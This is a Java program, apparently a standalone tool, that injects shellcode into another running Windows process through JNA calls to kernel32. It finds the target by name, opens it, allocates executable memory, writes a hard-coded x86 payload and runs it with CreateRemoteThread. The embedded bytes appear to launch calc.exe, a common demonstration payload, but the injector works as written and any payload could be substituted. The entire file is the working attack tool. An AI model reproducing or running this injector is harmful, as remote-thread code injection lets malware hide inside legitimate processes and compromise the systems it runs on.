package ShellCodeInsertion;

import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinDef.DWORD;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinNT;

import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.Pointer;
import com.sun.jna.Memory;

public class ShellCodeInjection {

  static byte[] shellcode = new byte[]{(byte) 0x89, (byte) 0xe5, (byte) 0x83, (byte) 0xec, (byte) 0x20,
    (byte) 0x31, (byte) 0xdb, (byte) 0x64, (byte) 0x8b, (byte) 0x5b, (byte) 0x30,
    (byte) 0x8b, (byte) 0x5b, (byte) 0x0c, (byte) 0x8b, (byte) 0x5b, (byte) 0x1c,
    (byte) 0x8b, (byte) 0x1b, (byte) 0x8b, (byte) 0x1b, (byte) 0x8b, (byte) 0x43,
    (byte) 0x08, (byte) 0x89, (byte) 0x45, (byte) 0xfc, (byte) 0x8b, (byte) 0x58,
    (byte) 0x3c, (byte) 0x01, (byte) 0xc3, (byte) 0x8b, (byte) 0x5b, (byte) 0x78,
    (byte) 0x01, (byte) 0xc3, (byte) 0x8b, (byte) 0x7b, (byte) 0x20, (byte) 0x01,
    (byte) 0xc7, (byte) 0x89, (byte) 0x7d, (byte) 0xf8, (byte) 0x8b, (byte) 0x4b,
    (byte) 0x24, (byte) 0x01, (byte) 0xc1, (byte) 0x89, (byte) 0x4d, (byte) 0xf4,
    (byte) 0x8b, (byte) 0x53, (byte) 0x1c, (byte) 0x01, (byte) 0xc2, (byte) 0x89,
    (byte) 0x55, (byte) 0xf0, (byte) 0x8b, (byte) 0x53, (byte) 0x14, (byte) 0x89,
    (byte) 0x55, (byte) 0xec, (byte) 0xeb, (byte) 0x32, (byte) 0x31, (byte) 0xc0,
    (byte) 0x8b, (byte) 0x55, (byte) 0xec, (byte) 0x8b, (byte) 0x7d, (byte) 0xf8,
    (byte) 0x8b, (byte) 0x75, (byte) 0x18, (byte) 0x31, (byte) 0xc9, (byte) 0xfc,
    (byte) 0x8b, (byte) 0x3c, (byte) 0x87, (byte) 0x03, (byte) 0x7d, (byte) 0xfc,
    (byte) 0x66, (byte) 0x83, (byte) 0xc1, (byte) 0x08, (byte) 0xf3, (byte) 0xa6,
    (byte) 0x74, (byte) 0x05, (byte) 0x40, (byte) 0x39, (byte) 0xd0, (byte) 0x72,
    (byte) 0xe4, (byte) 0x8b, (byte) 0x4d, (byte) 0xf4, (byte) 0x8b, (byte) 0x55,
    (byte) 0xf0, (byte) 0x66, (byte) 0x8b, (byte) 0x04, (byte) 0x41, (byte) 0x8b,
    (byte) 0x04, (byte) 0x82, (byte) 0x03, (byte) 0x45, (byte) 0xfc, (byte) 0xc3,
    (byte) 0xba, (byte) 0x78, (byte) 0x78, (byte) 0x65, (byte) 0x63, (byte) 0xc1,
    (byte) 0xea, (byte) 0x08, (byte) 0x52, (byte) 0x68, (byte) 0x57, (byte) 0x69,
    (byte) 0x6e, (byte) 0x45, (byte) 0x89, (byte) 0x65, (byte) 0x18, (byte) 0xe8,
    (byte) 0xb8, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x31, (byte) 0xc9,
    (byte) 0x51, (byte) 0x68, (byte) 0x2e, (byte) 0x65, (byte) 0x78, (byte) 0x65,
    (byte) 0x68, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x89,
    (byte) 0xe3, (byte) 0x41, (byte) 0x51, (byte) 0x53, (byte) 0xff, (byte) 0xd0,
    (byte) 0x31, (byte) 0xc9, (byte) 0xb9, (byte) 0x01, (byte) 0x65, (byte) 0x73,
    (byte) 0x73, (byte) 0xc1, (byte) 0xe9, (byte) 0x08, (byte) 0x51, (byte) 0x68,
    (byte) 0x50, (byte) 0x72, (byte) 0x6f, (byte) 0x63, (byte) 0x68, (byte) 0x45,
    (byte) 0x78, (byte) 0x69, (byte) 0x74, (byte) 0x89, (byte) 0x65, (byte) 0x18,
    (byte) 0xe8, (byte) 0x87, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x31,
    (byte) 0xd2, (byte) 0x52, (byte) 0xff, (byte) 0xd0};

  private static boolean checkProcessBit(Pointer hOpenedProcess) {
    IntByReference intByReference = new IntByReference();
    WinNT.HANDLE handle = new WinNT.HANDLE(hOpenedProcess);

    if (!kernel32.IsWow64Process(handle, intByReference)) {
      System.err.println("Couldn't open handle to the process!");
      System.exit(1);
    }

    return intByReference.getValue() == 0;
  }
  static Kernel32 kernel32 = (Kernel32) Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
  static IKernel32 iKernel32 = (IKernel32) Native.loadLibrary("kernel32", IKernel32.class);
  static String usage = "Usage: Java -jar ShellCodeInjection.jar [processName]" + System.getProperty("line.separator") + "processName example: notepad++.exe";

  interface IKernel32 extends StdCallLibrary {

    boolean WriteProcessMemory(Pointer p, int address, Memory bufferToWrite, int size, IntByReference written);

    boolean ReadProcessMemory(Pointer hProcess, int inBaseAddress, Pointer outputBuffer, int nSize, IntByReference outNumberOfBytesRead);

    int VirtualQueryEx(Pointer hProcess, Pointer lpMinimumApplicationAddress, Pointer lpBuffer, int dwLength);

    Pointer OpenProcess(int desired, boolean inherit, int pid);

    int VirtualAllocEx(Pointer hProcess, Pointer lpAddress, int i,
            int flAllocationType, int flProtect);

    void CreateRemoteThread(Pointer hOpenedProcess, Object object, int i, int baseAddress, int j, int k,
            Object object2);
  }

  public static void main(String[] args) {
    String pName = "";

    if (args.length < 1) {
      System.err.println(usage);
      System.exit(1);
    }
    try {
      pName = args[0];
    } catch (NumberFormatException e) {
      System.err.println(usage);
      System.exit(1);
    }

    long id = findID(pName);
    
    if (id == 0L) {
      System.err.println("The process was not found : " + pName);
      System.exit(1);
    }
    System.out.println(pName + "Id: " + id);

    Pointer processPointer = iKernel32.OpenProcess(0x0010 + 0x0020 + 0x0008 + 0x0400 + 0x0002, true, (int) id);

    if (checkProcessBit(processPointer)) {
      System.err.println("The target process is 64bit which is currently not supported");
      System.exit(0);
    }

    IntByReference bytes = new IntByReference(0);
    Memory buffer = new Memory(shellcode.length);

    for (int i = 0; i <  shellcode.length; i++) {
      buffer.setByte(i, shellcode[i]);
    }

    int address = iKernel32.VirtualAllocEx(processPointer, Pointer.createConstant(0),  shellcode.length, 4096, 64);
    System.out.println("Memory Allocated: " + Integer.toHexString(address));

    iKernel32.WriteProcessMemory(processPointer, address, buffer,  shellcode.length, bytes);
    System.out.println("Writen " + bytes.getValue() + " bytes.");

    iKernel32.CreateRemoteThread(processPointer, null, 0, address, 0, 0, null);
  }

  static long findID(String processName) {
    Tlhelp32.PROCESSENTRY32.ByReference processInfo = new Tlhelp32.PROCESSENTRY32.ByReference();
    WinNT.HANDLE processHandle = kernel32.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new DWORD(0L));

    try {
      kernel32.Process32First(processHandle, processInfo);

      if (processName.equals(Native.toString(processInfo.szExeFile))) {
        return processInfo.th32ProcessID.longValue();
      }

      while (kernel32.Process32Next(processHandle, processInfo)) {
        if (processName.equals(Native.toString(processInfo.szExeFile))) {
          return processInfo.th32ProcessID.longValue();
        }
      }

      return 0L;

    } finally {
      kernel32.CloseHandle(processHandle);
    }
  }
}
